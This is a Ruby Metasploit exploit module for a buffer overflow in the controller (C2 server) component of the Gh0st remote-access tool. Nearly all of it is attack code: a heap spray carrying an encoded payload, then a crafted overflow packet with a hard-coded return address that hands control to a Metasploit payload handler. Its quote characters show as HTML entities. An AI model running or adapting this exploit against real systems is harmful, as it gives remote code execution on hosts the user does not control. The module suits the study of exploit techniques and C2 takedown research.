# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;zlib&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Gh0st Client buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a Memory buffer overflow in the Gh0st client (C2 server)
      },
      &#039;Author&#039;         => &#039;Professor Plum&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;AllowWin32SEH&#039; => true
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1000,
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumMixed
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DisclosureDate&#039; => &#039;Jul 27 2017&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Gh0st Beta 3.6&#039;, { &#039;Ret&#039; => 0x06001010 }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        OptString.new(&#039;MAGIC&#039;, [true, &#039;The 5 char magic used by the server&#039;, &#039;Gh0st&#039;]),
        Opt::RPORT(80)
      ]
    )
  end
 
  def make_packet(id, data)
    msg = id.chr + data
  end
 
  def validate_response(data)
    if data.nil?
      print_status(&#039;Server closed connection&#039;)
      return false
    end
    if data.empty?
      print_status(&#039;No response recieved&#039;)
      return false
    end
    if data.size < 13
      print_status(&#039;Invalid packet&#039;)
      print_status(data)
      return false
    end
    mag, pktlen, msglen = data[0..13].unpack(&#039;a&#039; + datastore[&#039;MAGIC&#039;].size.to_s + &#039;VV&#039;)
    if mag.index(datastore[&#039;MAGIC&#039;]) != 0
      print_status(&#039;Bad magic: &#039; + mag[0..datastore[&#039;MAGIC&#039;].size])
      return false
    end
    if pktlen != data.size
      print_status(&#039;Packet size mismatch&#039;)
      return false
    end
    msg = Zlib::Inflate.inflate(data[13..data.size])
    if msg.size != msglen
      return false
    end
    return true
  end
 
  def check
    connect
    sock.put(make_packet(101, "\x00")) # heartbeat
    if validate_response(sock.get_once || &#039;&#039;)
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end
 
  def exploit
    print_status("Trying target #{target.name}")
    print_status(&#039;Spraying heap...&#039;)
    for i in 0..100
      connect
      sock.put(make_packet(101, "\x90" * 3 + "\x90\x83\xc0\x05" * 1024 * 1024 + payload.encoded))
      if not validate_response(sock.get_once)
        disconnect
        return
      end
    end
 
    for i in 103..107
      print_status("Trying command #{i}...")
      begin
        connect
        sploit = make_packet(i, "\0" * 1064 + [target[&#039;Ret&#039;] - 0xA0].pack(&#039;V&#039;) + &#039;a&#039; * 28)
        sock.put(sploit)
        if validate_response(sock.get_once)
          next
        end
        sleep(0.1)
        break
      rescue EOFError
        print_status(&#039;Invalid&#039;)
      end
    end
    handler
    disconnect
  end
end

